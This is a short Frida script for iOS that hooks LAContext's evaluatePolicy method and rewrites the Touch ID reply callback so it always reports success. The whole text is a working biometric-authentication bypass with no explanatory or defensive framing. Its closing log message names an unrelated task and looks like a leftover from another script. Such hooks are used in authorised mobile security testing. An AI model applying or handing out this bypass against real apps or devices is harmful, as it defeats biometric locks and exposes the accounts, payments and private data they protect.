if (ObjC.available)
{    
	// Authenticate with TouchID
    var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
    Interceptor.attach(hook.implementation, {

        onEnter: function(args) {
            console.log("info: hooking Touch ID");

            var block = new ObjC.Block(args[4]); // hook the reply callback
            var callback = block.implementation;
            block.implementation = function(error, value) {
                var reply = callback(1, null); // always return YES
                return reply;
            };
        }
    });
}
else
{
    console.log("Objective-C Runtime is not available!");
}
console.log("[*] Completed: Find All Methods of a Specific Class");	